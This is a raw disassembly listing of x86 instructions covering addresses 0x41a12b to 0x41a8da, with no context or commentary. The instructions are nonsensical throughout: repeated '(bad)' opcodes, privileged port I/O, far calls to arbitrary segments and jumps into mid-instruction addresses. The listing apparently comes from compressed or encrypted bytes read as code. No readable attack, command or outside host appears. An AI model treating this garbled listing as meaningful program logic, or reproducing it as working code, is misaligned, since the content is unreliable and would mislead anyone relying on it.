  41a12b:	xor    al,BYTE PTR [eax+ebp*4-0x4d]
  41a12f:	shr    DWORD PTR [eax-0xca7cfbe],1
  41a135:	iret   
  41a136:	(bad)  
  41a137:	fld    DWORD PTR [eax+0x54637b9a]
  41a13d:	push   edx
  41a13e:	inc    esi
  41a13f:	sar    al,cl
  41a141:	push   ds
  41a142:	(bad)  
  41a143:	fdiv   st,st(4)
  41a145:	ds retf 
  41a147:	fstp   TBYTE PTR [edi+0x4b]
  41a14a:	repz sbb BYTE PTR [esi],ch
  41a14d:	jle    0x41a14a
  41a14f:	(bad)  
  41a150:	sti    
  41a151:	(bad)  
  41a152:	and    ebx,ebx
  41a154:	xchg   ebx,eax
  41a155:	call   0xb506:0x1d8d6a66
  41a15c:	cmc    
  41a15d:	retf   0x97e6
  41a160:	sbb    DWORD PTR [ebp-0x43],esi
  41a163:	mov    ds:0x684fa9c0,al
  41a168:	pop    ss
  41a169:	cdq    
  41a16a:	shl    edx,0x70
  41a16d:	into   
  41a16e:	or     edx,0x3e0b3f89
  41a174:	outs   dx,BYTE PTR ds:[esi]
  41a175:	inc    esi
  41a176:	mov    DWORD PTR [ebx],edi
  41a178:	jno    0x41a157
  41a17a:	mov    ebp,0xe6f3fddc
  41a17f:	xchg   ebp,eax
  41a180:	popa   
  41a181:	mov    ss,WORD PTR [eax-0x22a3935b]
  41a187:	sar    bh,1
  41a189:	cmp    BYTE PTR [eax-0x7],0x9
  41a18d:	xor    edi,ebp
  41a18f:	xchg   esi,eax
  41a190:	stos   BYTE PTR es:[edi],al
  41a191:	inc    eax
  41a192:	fild   DWORD PTR [edx+ecx*1]
  41a195:	cwde   
  41a196:	add    eax,0xaf7af57a
  41a19b:	xchg   ecx,eax
  41a19c:	jmp    0x41a211
  41a19e:	outs   dx,DWORD PTR ds:[esi]
  41a19f:	dec    ebx
  41a1a0:	aad    0x6
  41a1a2:	mov    DWORD PTR [ebp+0xf840fe8],0x55adc4dc
  41a1ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a1ad:	fimul  DWORD PTR [ecx]
  41a1af:	int    0x76
  41a1b1:	(bad)  
  41a1b2:	imul   ebx,DWORD PTR [ebx],0xe1d983b9
  41a1b8:	pop    eax
  41a1b9:	in     eax,dx
  41a1ba:	cs cmc 
  41a1bc:	ficom  DWORD PTR [ecx-0x68]
  41a1bf:	or     esi,DWORD PTR [esi-0x40c17461]
  41a1c5:	iret   
  41a1c6:	pop    ds
  41a1c7:	sub    eax,esi
  41a1c9:	cmc    
  41a1ca:	pusha  
  41a1cb:	das    
  41a1cc:	test   al,0xb6
  41a1ce:	repnz out dx,al
  41a1d0:	ss out 0xcf,eax
  41a1d3:	repz out 0x15,al
  41a1d6:	pop    es
  41a1d7:	addr16 dec esp
  41a1d9:	and    BYTE PTR [eax+esi*8],cl
  41a1dc:	jmp    0x5951:0x37573d65
  41a1e3:	inc    edx
  41a1e4:	in     eax,dx
  41a1e5:	jmp    0x41a19b
  41a1e7:	adc    eax,0xcc8560cf
  41a1ec:	pop    es
  41a1ed:	iret   
  41a1ee:	and    DWORD PTR [edx+0x51f08446],0x570e812b
  41a1f8:	sub    ebp,ebx
  41a1fa:	je     0x41a245
  41a1fc:	mov    edx,0x8aa16f32
  41a201:	mov    ebp,0x4c321f28
  41a206:	jmp    0x41a1ac
  41a208:	je     0x41a1ff
  41a20a:	mov    bl,0xbe
  41a20c:	push   ss
  41a20d:	and    BYTE PTR [eax-0x5f5083f6],cl
  41a213:	and    DWORD PTR [edx-0x22],edi
  41a216:	cmc    
  41a217:	lea    eax,[edx+edi*1+0xbd733b3]
  41a21e:	jl     0x41a20a
  41a220:	sbb    al,0x93
  41a222:	push   0xdae164e1
  41a227:	sahf   
  41a228:	stos   BYTE PTR es:[edi],al
  41a229:	das    
  41a22a:	xor    eax,0x658f8f0b
  41a22f:	dec    esp
  41a230:	loop   0x41a285
  41a232:	inc    eax
  41a233:	rcl    DWORD PTR [edx-0x7c620e3d],cl
  41a239:	sahf   
  41a23a:	dec    esp
  41a23b:	test   al,0xce
  41a23d:	nop
  41a23e:	cli    
  41a23f:	mov    ah,0x76
  41a241:	lods   al,BYTE PTR ds:[esi]
  41a242:	mov    dl,0x5a
  41a244:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a245:	push   0x5a
  41a247:	bound  eax,QWORD PTR [edi-0x492e51ab]
  41a24d:	inc    edi
  41a24e:	xor    al,0x82
  41a250:	xor    al,0x7e
  41a252:	xlat   BYTE PTR ds:[ebx]
  41a253:	dec    ecx
  41a254:	push   es
  41a255:	mov    ds:0x23be0007,eax
  41a25a:	sbb    BYTE PTR [esi],al
  41a25c:	push   ebx
  41a25d:	xor    bl,BYTE PTR [ecx]
  41a25f:	cdq    
  41a260:	out    dx,eax
  41a261:	mov    edi,0xb62149e
  41a266:	lock int 0x74
  41a269:	sbb    BYTE PTR [edi-0x3d],bl
  41a26c:	in     eax,0x8b
  41a26e:	mov    ebp,0xab2a2e47
  41a273:	or     BYTE PTR [edx],bl
  41a275:	xchg   esi,eax
  41a276:	and    eax,0xbab6a8d6
  41a27b:	add    DWORD PTR [edx-0x44],esi
  41a27e:	repnz stos DWORD PTR es:[edi],eax
  41a280:	pop    ss
  41a281:	lods   al,BYTE PTR ds:[esi]
  41a282:	mov    eax,0x223a0eb3
  41a287:	cmp    ebp,DWORD PTR [edi+0x6613c361]
  41a28d:	mov    al,0xbf
  41a28f:	dec    edi
  41a290:	aam    0x32
  41a292:	adc    dl,dh
  41a294:	xchg   BYTE PTR [ecx-0xf],ah
  41a297:	rol    DWORD PTR [eax+0x75],cl
  41a29a:	es cmc 
  41a29c:	pop    edi
  41a29d:	sub    edi,DWORD PTR [ecx+0x20991e61]
  41a2a3:	mov    dl,0xd4
  41a2a5:	cwde   
  41a2a6:	mov    ebx,0xa6d2e344
  41a2ab:	jbe    0x41a2b3
  41a2ad:	lods   al,BYTE PTR ds:[esi]
  41a2ae:	test   DWORD PTR [ecx-0x335ab6f],esi
  41a2b4:	jecxz  0x41a28f
  41a2b6:	fadd   QWORD PTR [ebp-0x8]
  41a2b9:	xor    ch,bl
  41a2bb:	xchg   dh,ah
  41a2bd:	and    bh,BYTE PTR [ebx-0x54]
  41a2c0:	test   BYTE PTR [edx],bl
  41a2c2:	sbb    al,0x7e
  41a2c4:	jno    0x41a29f
  41a2c6:	pop    ebx
  41a2c7:	sar    DWORD PTR ds:0x3232,0x7a
  41a2cd:	sub    DWORD PTR [edi+0x7],ecx
  41a2d0:	add    eax,0xf9775124
  41a2d5:	lahf   
  41a2d6:	ja     0x41a330
  41a2d8:	mov    dl,0x73
  41a2da:	and    bh,bl
  41a2dc:	(bad)  
  41a2dd:	mov    al,0x4d
  41a2df:	outs   dx,BYTE PTR ds:[esi]
  41a2e0:	mov    bh,0x7e
  41a2e2:	xchg   esp,eax
  41a2e3:	mov    cs,WORD PTR [ecx+0x2c]
  41a2e6:	mov    ?,WORD PTR [ecx-0x41]
  41a2e9:	jecxz  0x41a2b7
  41a2eb:	cmovbe edx,ebp
  41a2ee:	xchg   edi,eax
  41a2ef:	adc    cl,ah
  41a2f1:	mov    bh,0xf5
  41a2f3:	adc    ebp,ebp
  41a2f5:	psubusb mm7,QWORD PTR [eax+0x65]
  41a2f9:	mov    dl,0x2c
  41a2fb:	jge    0x41a2d8
  41a2fd:	cli    
  41a2fe:	outs   dx,DWORD PTR ds:[esi]
  41a2ff:	jo     0x41a2b0
  41a301:	jbe    0x41a322
  41a303:	cmp    esp,DWORD PTR [edx+0x3687ea06]
  41a309:	scas   eax,DWORD PTR es:[edi]
  41a30a:	pushf  
  41a30b:	or     BYTE PTR [ecx+ebp*1],dh
  41a30e:	push   es
  41a30f:	and    edi,DWORD PTR [esi+0x4d07f7ed]
  41a315:	call   0x7374:0x374acf98
  41a31c:	sub    ebx,esi
  41a31e:	retf   0xba02
  41a321:	test   DWORD PTR [edx+0x74],0xf5ff3aca
  41a328:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a329:	push   cs
  41a32a:	mov    edx,0xc477f8f
  41a32f:	mov    gs,WORD PTR [esi+0x3c]
  41a332:	sbb    DWORD PTR [ecx-0x1f],eax
  41a335:	xor    BYTE PTR [ebx],0x5f
  41a338:	pop    edx
  41a339:	fadd   st,st(1)
  41a33b:	sti    
  41a33c:	sub    al,0x57
  41a33e:	fwait
  41a33f:	loop   0x41a347
  41a341:	mov    eax,ds:0x5e83a9
  41a346:	xchg   BYTE PTR [edi-0x40],al
  41a349:	dec    dl
  41a34b:	sub    eax,0xb6557571
  41a350:	fdiv   DWORD PTR [edx-0x54]
  41a353:	push   es
  41a354:	sub    ebp,ebp
  41a356:	jge    0x41a31c
  41a358:	cli    
  41a359:	shr    DWORD PTR [ebx-0x18de0aad],cl
  41a35f:	cmp    bh,cl
  41a361:	mov    eax,0xc17d0366
  41a366:	push   esp
  41a367:	stos   BYTE PTR es:[edi],al
  41a368:	xchg   ebx,eax
  41a369:	dec    eax
  41a36a:	dec    ecx
  41a36b:	push   0xb299fdab
  41a370:	mov    DWORD PTR [esi+ecx*4+0x76c91673],edx
  41a377:	daa    
  41a378:	jae    0x41a3e0
  41a37a:	inc    ecx
  41a37b:	repz and eax,DWORD PTR [eax]
  41a37e:	push   0x55
  41a380:	push   ecx
  41a381:	cmp    al,0x2e
  41a383:	pop    es
  41a384:	fwait
  41a385:	push   esp
  41a386:	dec    ebx
  41a387:	cmp    al,BYTE PTR [edx+esi*8-0x54]
  41a38b:	sbb    DWORD PTR [esi+0x791c5396],ebp
  41a391:	data16 mov fs,WORD PTR [ecx+ebp*8-0x73178644]
  41a399:	pushf  
  41a39a:	loop   0x41a363
  41a39c:	sbb    ah,BYTE PTR [ecx]
  41a39e:	pop    ecx
  41a39f:	gs out 0xb9,al
  41a3a2:	add    DWORD PTR [edi+eiz*8],0x65
  41a3a6:	push   ecx
  41a3a7:	sbb    DWORD PTR [edx-0x1e],eax
  41a3aa:	cmc    
  41a3ab:	jne    0x41a387
  41a3ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a3ae:	jns    0x41a36b
  41a3b0:	sub    al,0x36
  41a3b2:	inc    eax
  41a3b3:	mov    ebp,DWORD PTR [edx+0x7afd317]
  41a3b9:	sbb    dh,BYTE PTR [ecx+0x12]
  41a3bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a3bd:	mul    BYTE PTR [edi]
  41a3bf:	mov    ecx,0xf3c76bd
  41a3c4:	mov    WORD PTR [ebx-0x6b],?
  41a3c7:	fidiv  DWORD PTR [edi+0x528f0400]
  41a3cd:	xchg   edi,eax
  41a3ce:	push   ss
  41a3cf:	nop
  41a3d0:	ds inc edx
  41a3d2:	dec    ecx
  41a3d3:	(bad)  
  41a3d4:	int    0x6f
  41a3d6:	loop   0x41a3a2
  41a3d8:	gs and eax,0xdb548916
  41a3de:	cmp    BYTE PTR [eax+0x1656538c],ch
  41a3e4:	imul   edi,DWORD PTR [ecx+0x35],0xe3f6c041
  41a3eb:	hlt    
  41a3ec:	rcl    DWORD PTR cs:[ebx-0x16ee6966],1
  41a3f3:	stos   DWORD PTR es:[edi],eax
  41a3f4:	mov    ebx,DWORD PTR [eax+esi*8-0x75f66e58]
  41a3fb:	call   0x28437cb2
  41a400:	popa   
  41a401:	cmp    DWORD PTR [eax+0x6ea74585],0x2
  41a408:	imul   edi,DWORD PTR ds:0x49045e0,0x8fe71eba
  41a412:	in     eax,dx
  41a413:	call   0xd0cf:0xcf5117f0
  41a41a:	ja     0x41a48f
  41a41c:	push   cs
  41a41d:	imul   ebx,DWORD PTR [eax+0x4f],0xfffffffc
  41a421:	rcr    ebp,0xcd
  41a424:	stos   BYTE PTR es:[edi],al
  41a425:	dec    esp
  41a426:	scas   al,BYTE PTR es:[edi]
  41a427:	xor    DWORD PTR [ecx],ecx
  41a429:	fisttp DWORD PTR [edi-0xaa4f0cd]
  41a42f:	sub    bl,BYTE PTR [esi+0xd]
  41a432:	xor    BYTE PTR [ecx+0x63],ch
  41a435:	stc    
  41a436:	sub    eax,0x27bf10d2
  41a43b:	sahf   
  41a43c:	fadd   QWORD PTR [ebx-0x1a7b2da6]
  41a442:	(bad)  
  41a443:	mov    ecx,0x42cb4f56
  41a448:	push   es
  41a449:	push   edi
  41a44a:	xor    eax,0x8d7dbb9c
  41a44f:	adc    al,0xe7
  41a451:	pop    edx
  41a452:	mov    bl,0xb6
  41a454:	pop    edi
  41a455:	cmp    dh,BYTE PTR [ecx-0x61a5429b]
  41a45b:	mov    edi,0x1b3e12f7
  41a460:	xchg   edx,eax
  41a461:	outs   dx,BYTE PTR ds:[esi]
  41a462:	scas   eax,DWORD PTR es:[edi]
  41a463:	add    DWORD PTR [esi+0x57],ecx
  41a466:	push   ss
  41a467:	jge    0x41a49c
  41a469:	jno    0x41a479
  41a46b:	mov    ds:0x966864ef,eax
  41a470:	inc    edi
  41a471:	pop    ss
  41a472:	cmp    esi,eax
  41a474:	aas    
  41a475:	daa    
  41a476:	xchg   ebp,eax
  41a477:	addr16 dec edi
  41a479:	sbb    edx,DWORD PTR [edi+0x601ed975]
  41a47f:	xlat   BYTE PTR ds:[ebx]
  41a480:	mov    ecx,DWORD PTR [ebp-0x68b3f981]
  41a486:	adc    al,0xf2
  41a488:	lds    ecx,FWORD PTR [ecx-0x2e]
  41a48b:	adc    al,0xd8
  41a48d:	fnsave [eax+eax*1]
  41a490:	mov    ch,0x26
  41a492:	test   DWORD PTR ds:0xc9835941,edx
  41a498:	dec    esp
  41a499:	pop    esp
  41a49a:	jp     0x41a4f5
  41a49c:	mov    eax,ds:0xadee6ba8
  41a4a1:	push   0xffffffa5
  41a4a3:	adc    al,BYTE PTR [eax]
  41a4a5:	dec    eax
  41a4a6:	loope  0x41a522
  41a4a8:	rcl    dl,0x21
  41a4ab:	jle    0x41a51f
  41a4ad:	mov    al,ds:0x4eb3754
  41a4b2:	lods   al,BYTE PTR ds:[esi]
  41a4b3:	xchg   edi,eax
  41a4b4:	cmp    eax,0x4ae4b144
  41a4b9:	and    BYTE PTR es:[edx-0x333f2a66],ch
  41a4c0:	addr16 fwait
  41a4c2:	jg     0x41a4d2
  41a4c4:	add    ecx,eax
  41a4c6:	push   edx
  41a4c7:	aad    0x69
  41a4c9:	sub    DWORD PTR [edi+edi*2+0x19b226d8],edi
  41a4d0:	cmp    BYTE PTR [ecx],0x2a
  41a4d3:	aas    
  41a4d4:	push   0x1dcdca35
  41a4d9:	sbb    ebp,esp
  41a4db:	call   0xd08a:0xaf501981
  41a4e2:	push   edi
  41a4e3:	push   es
  41a4e4:	icebp  
  41a4e5:	dec    eax
  41a4e6:	lock inc edi
  41a4e8:	dec    ebp
  41a4e9:	enter  0x6b8b,0xf1
  41a4ed:	push   0x1078fc4a
  41a4f2:	jmp    FWORD PTR [ebx-0x54]
  41a4f5:	adc    DWORD PTR ds:0xa7b6a301,eax
  41a4fb:	push   0x789160b6
  41a500:	popa   
  41a501:	je     0x41a4c4
  41a503:	adc    al,0x2a
  41a505:	mov    esp,0x26fdcf74
  41a50a:	js     0x41a52f
  41a50c:	jnp    0x41a566
  41a50e:	es ins BYTE PTR es:[edi],dx
  41a510:	add    al,0x9a
  41a512:	pop    es
  41a513:	sbb    al,0x73
  41a515:	mov    ebx,0x11f38d8
  41a51a:	test   al,0xd5
  41a51c:	pop    eax
  41a51d:	retf   
  41a51e:	gs jo  0x41a4f4
  41a521:	xlat   BYTE PTR ds:[ebx]
  41a522:	scas   al,BYTE PTR es:[edi]
  41a523:	dec    esi
  41a524:	mov    al,ds:0xb71ec467
  41a529:	stc    
  41a52a:	stos   DWORD PTR es:[edi],eax
  41a52b:	aaa    
  41a52c:	hlt    
  41a52d:	rep stos BYTE PTR es:[edi],al
  41a52f:	add    BYTE PTR [ebx],bh
  41a531:	repz or ah,BYTE PTR [ecx-0x1e]
  41a535:	pop    edx
  41a536:	fstp   DWORD PTR [ebx]
  41a538:	or     cl,bh
  41a53a:	mov    edx,0xbbded2d6
  41a53f:	pop    esp
  41a540:	mov    edi,0x3675069b
  41a545:	out    0x53,eax
  41a547:	pop    ecx
  41a548:	jb     0x41a587
  41a54a:	sti    
  41a54b:	fcomp  QWORD PTR [ebx+ecx*4-0x39]
  41a54f:	popf   
  41a550:	ror    esi,0xe4
  41a553:	dec    ecx
  41a554:	int    0x87
  41a556:	sbb    DWORD PTR [edx-0x16079e74],0xb50d13a3
  41a560:	lods   eax,DWORD PTR ds:[esi]
  41a561:	test   eax,0x6dc6f5d1
  41a567:	mov    al,BYTE PTR [edi]
  41a569:	es out 0x96,eax
  41a56c:	and    al,0x4d
  41a56e:	push   ebx
  41a56f:	adc    esi,esi
  41a571:	outs   dx,DWORD PTR ds:[esi]
  41a572:	scas   eax,DWORD PTR es:[edi]
  41a573:	stos   BYTE PTR es:[edi],al
  41a574:	cmp    al,0x20
  41a576:	push   ss
  41a577:	sub    eax,0xd754411e
  41a57c:	rol    eax,1
  41a57e:	and    eax,0x38b53399
  41a583:	aad    0xe5
  41a585:	pop    esp
  41a586:	fstp   st(5)
  41a588:	mov    ds:0x2e48cc06,al
  41a58d:	mov    esp,0x2ae2a684
  41a592:	dec    esp
  41a593:	sbb    eax,DWORD PTR [ebp+ecx*4+0x75d19d5b]
  41a59a:	inc    edx
  41a59b:	iret   
  41a59c:	mov    bl,0x18
  41a59e:	dec    esp
  41a59f:	inc    ecx
  41a5a0:	aam    0xbf
  41a5a2:	stc    
  41a5a3:	sbb    BYTE PTR [ecx-0x73caaefd],al
  41a5a9:	(bad)
  41a5ae:	pop    eax
  41a5af:	ins    DWORD PTR es:[edi],dx
  41a5b0:	inc    ebx
  41a5b1:	pushf  
  41a5b2:	addr16 aam 0xf4
  41a5b5:	scas   al,BYTE PTR es:[edi]
  41a5b6:	mov    al,BYTE PTR [edx+0x1b]
  41a5b9:	lock xor BYTE PTR [ecx+0x75],ch
  41a5bd:	icebp  
  41a5be:	es pop ecx
  41a5c0:	mov    ch,0x59
  41a5c2:	xor    DWORD PTR [ecx+edx*1-0x5974c0fe],0x66450dba
  41a5cd:	push   ss
  41a5ce:	(bad)  
  41a5cf:	cmp    BYTE PTR [esi+0x2a],cl
  41a5d2:	sbb    ah,dl
  41a5d4:	pop    ecx
  41a5d5:	or     eax,0xc6746038
  41a5da:	push   esi
  41a5db:	adc    edi,edi
  41a5dd:	mov    edi,0x45a8991a
  41a5e2:	and    esp,DWORD PTR [eax+0x6f54fe19]
  41a5e8:	es cli 
  41a5ea:	dec    ebp
  41a5eb:	fld    DWORD PTR [eax+0x5e]
  41a5ee:	es test eax,0xa4bebf8f
  41a5f4:	adc    eax,0x4e70cc05
  41a5f9:	lods   al,BYTE PTR ds:[esi]
  41a5fa:	inc    ebx
  41a5fb:	imul   bp,WORD PTR [ebx+ebx*8],0x8237
  41a601:	imul   eax,esp,0x2d557e5
  41a607:	cmp    ebp,DWORD PTR [edx-0x10dc83b8]
  41a60d:	or     DWORD PTR [ecx],edx
  41a60f:	or     BYTE PTR [ecx-0x35c409a7],dh
  41a615:	and    eax,0x7c302ec
  41a61a:	(bad)  gs:[edx-0x3cbe4b2]
  41a621:	mov    WORD PTR ds:0x760c814b,gs
  41a627:	mov    al,ds:0x1af787df
  41a62c:	repz sahf 
  41a62e:	pop    edi
  41a62f:	adc    dl,ah
  41a631:	fcom   QWORD PTR [ecx+0x6e]
  41a634:	sub    edi,edx
  41a636:	aas    
  41a637:	dec    ebp
  41a638:	mov    ah,0x43
  41a63a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a63b:	je     0x41a5d0
  41a63d:	adc    eax,0x6a6bfa4d
  41a642:	jle    0x41a61c
  41a644:	add    DWORD PTR [ebp-0x2],ecx
  41a647:	xor    al,0xdd
  41a649:	or     BYTE PTR [ebp+0x1b],0x1b
  41a64d:	int    0x1a
  41a64f:	mov    al,0xcc
  41a651:	sbb    eax,0xa8664b01
  41a656:	pop    edx
  41a657:	cmp    ch,BYTE PTR [ebp-0x58faa5dd]
  41a65d:	(bad)  [eax]
  41a65f:	scas   eax,DWORD PTR es:[edi]
  41a660:	mov    edi,0xfdba6868
  41a665:	div    BYTE PTR [esi+0x7fa18662]
  41a66b:	pusha  
  41a66c:	dec    ebp
  41a66d:	inc    ebx
  41a66e:	les    ecx,FWORD PTR [ebp+ebp*2-0x50]
  41a672:	daa    
  41a673:	sbb    DWORD PTR [eax+0x4e95f9b7],ebx
  41a679:	mov    eax,0x493b999c
  41a67e:	enter  0xce56,0x32
  41a682:	jo     0x41a651
  41a684:	mov    bh,0x35
  41a686:	push   0x5326f6d1
  41a68b:	sub    DWORD PTR [ebp+0x18069c6f],ebx
  41a691:	mov    BYTE PTR [ecx],al
  41a693:	mov    ds:0x3a206bc5,al
  41a698:	jle    0x41a67a
  41a69a:	inc    ecx
  41a69b:	cmp    eax,0xc2c1e11f
  41a6a0:	or     ah,BYTE PTR es:[esi]
  41a6a3:	add    DWORD PTR [ebx+0x11],ebp
  41a6a6:	adc    eax,0x68a8cc63
  41a6ab:	xchg   ebp,eax
  41a6ac:	add    edx,DWORD PTR ds:0xc623c64c
  41a6b2:	imul   ebx,DWORD PTR [ebx+0x11],0x20
  41a6b6:	ds mov dl,0xb3
  41a6b9:	push   edi
  41a6ba:	ins    BYTE PTR es:[edi],dx
  41a6bb:	scas   al,BYTE PTR es:[edi]
  41a6bc:	pushf  
  41a6bd:	aas    
  41a6be:	xor    BYTE PTR [ebp+0x6fe90072],0x7e
  41a6c5:	adc    al,0x7f
  41a6c7:	and    ah,ch
  41a6c9:	jbe    0x41a654
  41a6cb:	dec    BYTE PTR [esi-0xc796040]
  41a6d1:	jno    0x41a6fe
  41a6d3:	and    BYTE PTR [eax+0x5dc08f9e],ch
  41a6d9:	sbb    ebp,edx
  41a6db:	push   edx
  41a6dc:	aaa    
  41a6dd:	ss mov al,0xff
  41a6e0:	repnz and ecx,DWORD PTR ds:0x34695cfe
  41a6e7:	(bad)  
  41a6e8:	mov    esi,0xb6a5c30d
  41a6ed:	es push 0x26ff9dde
  41a6f3:	pop    esp
  41a6f4:	test   al,0xd9
  41a6f6:	out    dx,eax
  41a6f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a6f8:	pop    ebp
  41a6f9:	mov    edx,0x5f5ad34b
  41a6fe:	and    DWORD PTR [edx-0x61],edi
  41a701:	push   ebx
  41a702:	shr    DWORD PTR [edi],1
  41a704:	into   
  41a705:	data16 sahf 
  41a707:	data16 into 
  41a709:	push   esi
  41a70a:	iret   
  41a70b:	jge    0x41a758
  41a70d:	or     ebp,ebx
  41a70f:	or     cl,dh
  41a711:	rdmsr  
  41a713:	adc    ebx,edi
  41a715:	pop    eax
  41a716:	mov    bh,0x76
  41a718:	or     edi,esp
  41a71a:	push   esi
  41a71b:	jb     0x41a770
  41a71d:	out    dx,eax
  41a71e:	mov    ah,dh
  41a720:	jnp    0x41a6ea
  41a722:	xlat   BYTE PTR ds:[ebx]
  41a723:	fisubr DWORD PTR [esi-0x43355349]
  41a729:	rcl    DWORD PTR [edx+0x42a68a1],1
  41a72f:	(bad)
  41a732:	in     eax,0x48
  41a734:	jb     0x41a755
  41a736:	mov    dh,0x2e
  41a738:	jle    0x41a6c2
  41a73a:	adc    cl,BYTE PTR [ebp-0x18]
  41a73d:	mov    esi,0xdb32826f
  41a742:	add    dh,al
  41a744:	push   edx
  41a745:	mov    ebp,0xd65db93
  41a74a:	shr    DWORD PTR [eax+0x37],cl
  41a74d:	jg     0x41a713
  41a74f:	repnz sbb DWORD PTR [ebx-0x7b],0x6f
  41a754:	pushf  
  41a755:	loope  0x41a713
  41a757:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a758:	add    al,0xcc
  41a75a:	aaa    
  41a75b:	jno    0x41a7b2
  41a75d:	fs test eax,0x56289140
  41a763:	jae    0x41a744
  41a765:	rcr    ah,0x19
  41a768:	xor    al,0x54
  41a76a:	hlt    
  41a76b:	pop    es
  41a76c:	cmp    DWORD PTR [edx],ecx
  41a76e:	adc    DWORD PTR [ebx+eax*4-0x3dd89890],edi
  41a775:	test   eax,0x6f81d319
  41a77a:	addr16 fs out 0xc0,al
  41a77e:	xor    esi,esi
  41a780:	fldenv [ecx]
  41a782:	repz cmp al,0xbd
  41a785:	bound  edx,QWORD PTR [ebx-0x4]
  41a788:	xchg   DWORD PTR [eax],eax
  41a78a:	aaa    
  41a78b:	ret    
  41a78c:	sub    eax,0x5b9f92b6
  41a791:	in     al,0xeb
  41a793:	pop    ds
  41a794:	loop   0x41a79f
  41a796:	mov    edi,0xb4c0da57
  41a79b:	prefetcht2 BYTE PTR [edx]
  41a79e:	push   eax
  41a79f:	enter  0x9039,0x73
  41a7a3:	aas    
  41a7a4:	sahf   
  41a7a5:	int3   
  41a7a6:	in     al,dx
  41a7a7:	paddd  mm4,QWORD PTR [ebx+0x6b]
  41a7ab:	add    al,0x9
  41a7ad:	js     0x41a7ea
  41a7af:	inc    esi
  41a7b0:	(bad)  
  41a7b1:	(bad)  
  41a7b2:	cmc    
  41a7b3:	das    
  41a7b4:	or     DWORD PTR [eax-0x33],0xa7897c47
  41a7bb:	sub    ah,BYTE PTR [edx+eax*1-0x3c]
  41a7bf:	stos   DWORD PTR es:[edi],eax
  41a7c0:	rcr    ebx,cl
  41a7c2:	pop    eax
  41a7c3:	push   cs
  41a7c4:	pop    ebx
  41a7c5:	jmp    0x78f5c9ec
  41a7ca:	rol    ch,0x13
  41a7cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a7ce:	and    al,0xb7
  41a7d0:	xor    eax,0xda5c2116
  41a7d5:	dec    edx
  41a7d6:	arpl   di,dx
  41a7d8:	pop    ecx
  41a7d9:	mov    al,0xd9
  41a7db:	test   DWORD PTR [ebx],ebx
  41a7dd:	inc    edx
  41a7de:	push   0xf7d2d447
  41a7e3:	push   edi
  41a7e4:	aas    
  41a7e5:	sub    BYTE PTR cs:[eax+0x5316867a],0x26
  41a7ed:	(bad)  
  41a7ef:	mov    ah,0x44
  41a7f1:	loopne 0x41a7b2
  41a7f3:	retf   0x5048
  41a7f6:	and    DWORD PTR [eax-0x20974652],0xa740314
  41a800:	and    edx,edi
  41a802:	jle    0x41a82a
  41a804:	jg     0x41a79f
  41a806:	loope  0x41a847
  41a808:	loopne 0x41a866
  41a80a:	(bad)  
  41a80b:	xor    edx,ecx
  41a80d:	outs   dx,BYTE PTR ds:[esi]
  41a80e:	and    eax,0xc088992d
  41a813:	int3   
  41a814:	outs   dx,DWORD PTR ds:[esi]
  41a815:	outs   dx,DWORD PTR ds:[esi]
  41a816:	xlat   BYTE PTR ds:[ebx]
  41a817:	ja     0x41a7a3
  41a819:	gs rcl edi,0xc8
  41a81d:	push   ebp
  41a81e:	push   edx
  41a81f:	stos   DWORD PTR es:[edi],eax
  41a820:	loope  0x41a7cf
  41a822:	fnstenv [edi-0x5e]
  41a825:	jo     0x41a83a
  41a827:	xor    BYTE PTR cs:[ecx-0x796d6319],dl
  41a82e:	jecxz  0x41a83b
  41a830:	in     eax,0x31
  41a832:	jne    0x41a7cb
  41a834:	rcl    edx,0x29
  41a837:	ins    DWORD PTR es:[edi],dx
  41a838:	cmp    bl,BYTE PTR [edx+ebx*4+0x848b28e]
  41a83f:	enter  0x52c9,0x8e
  41a843:	aaa    
  41a844:	test   DWORD PTR [ecx],0x46cbab4a
  41a84a:	pop    esi
  41a84b:	sahf   
  41a84c:	hlt    
  41a84d:	outs   dx,BYTE PTR ds:[esi]
  41a84e:	dec    esi
  41a84f:	out    dx,al
  41a850:	push   0xffffffe3
  41a852:	test   al,0x33
  41a854:	push   ss
  41a855:	cld    
  41a856:	rcr    DWORD PTR [eax-0x1e504],1
  41a85c:	mov    dh,0x9e
  41a85e:	mov    ch,0x5e
  41a860:	in     eax,0xa7
  41a862:	test   eax,0xea487c65
  41a867:	outs   dx,BYTE PTR ds:[esi]
  41a868:	push   ss
  41a869:	lahf   
  41a86a:	sub    eax,0x707f8f2b
  41a86f:	or     eax,0x89df8035
  41a874:	xor    al,0xe4
  41a876:	xlat   BYTE PTR ds:[ebx]
  41a877:	mov    ebp,0x787d6b69
  41a87c:	aas    
  41a87d:	cwde   
  41a87e:	fadd   st(0),st
  41a880:	xchg   esi,eax
  41a881:	mov    eax,0x664460f7
  41a886:	adc    cl,BYTE PTR [eax-0x6dd5e451]
  41a88c:	sbb    edi,esi
  41a88e:	mov    ds:0xf280fa18,al
  41a893:	pop    esi
  41a894:	pop    ebp
  41a895:	and    cl,BYTE PTR [ebx]
  41a897:	call   0x77985c46
  41a89c:	adc    eax,0x4e43bd88
  41a8a1:	or     BYTE PTR [ecx+0x21],cl
  41a8a4:	dec    ebx
  41a8a5:	in     eax,dx
  41a8a6:	push   ecx
  41a8a7:	fiadd  WORD PTR [edx-0x62]
  41a8aa:	dec    esi
  41a8ab:	sbb    al,0x30
  41a8ad:	fs shl bh,1
  41a8b0:	bound  esi,QWORD PTR [edx-0x11]
  41a8b3:	xchg   ecx,eax
  41a8b4:	cmp    eax,0x16c35361
  41a8b9:	test   eax,0x82194a5c
  41a8be:	xchg   esp,eax
  41a8bf:	mov    ebp,0xb5bbd34f
  41a8c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a8c5:	cdq    
  41a8c6:	cmp    eax,0x5ddd410c
  41a8cb:	and    bl,BYTE PTR [edx]
  41a8cd:	sbb    eax,0x63f54d3a
  41a8d2:	or     BYTE PTR [esi-0x28b85969],dl
  41a8d8:	dec    edi
  41a8d9:	push   ds
  41a8da:	dec    ebp
